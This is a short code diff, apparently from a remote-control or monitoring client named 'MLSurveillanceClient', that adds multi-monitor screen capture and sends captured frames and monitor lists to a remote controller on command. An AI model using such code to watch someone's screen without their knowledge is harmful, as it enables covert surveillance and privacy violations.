@@ -22,20 +22,24 @@ namespace MLSurveillanceClient.Handlers
         public static void Handle(object[] data)
         {
             var command = (RemoteDesktopCommand)data[1];
-            lock (NetworkHost)
-            {
-                if (command == RemoteDesktopCommand.RequestFrame)
-                    NetworkHost.Send((byte)NetworkCommand.RemoteDesktop, (byte)RemoteDesktopCommand.Frame, TakeScreenshot());
-            }
+            if (command == RemoteDesktopCommand.RequestFrame)
+                NetworkHost.Send((byte)NetworkCommand.RemoteDesktop, (byte)RemoteDesktopCommand.Frame, TakeScreenshot((int)data[2]));
+            if (command == RemoteDesktopCommand.GetMonitors && Screen.AllScreens != null && Screen.AllScreens.Length > 0)
+                NetworkHost.Send((byte)NetworkCommand.RemoteDesktop, (byte)RemoteDesktopCommand.MonitorResponce, Screen.AllScreens.Select(s => s.DeviceName).ToArray());
         }
 
-        private static byte[] TakeScreenshot()
+        private static byte[] TakeScreenshot(int monitor)
         {
-            var screen = Screen.PrimaryScreen;
-            using (var bmp = new Bitmap(screen.Bounds.Width, screen.Bounds.Height))
+            Screen selectedMonitor;
+            if (monitor == -1 || monitor > Screen.AllScreens.Length-1)
+                selectedMonitor = Screen.PrimaryScreen;
+            else
+                selectedMonitor = Screen.AllScreens[monitor];
+            using (var bmp = new Bitmap(selectedMonitor.Bounds.Width, selectedMonitor.Bounds.Height))
             {
                 var g = Graphics.FromImage(bmp);
-                g.CopyFromScreen(0, 0, 0, 0, screen.Bounds.Size);
+                g.CopyFromScreen(selectedMonitor.Bounds.X, selectedMonitor.Bounds.Y, 0, 0, selectedMonitor.Bounds.Size);
+                //g.CopyFromScreen(0, 0, 0, 0, selectedMonitor.Bounds.Size);
                 g.Dispose();
                 using (var ms = new MemoryStream())
                 {
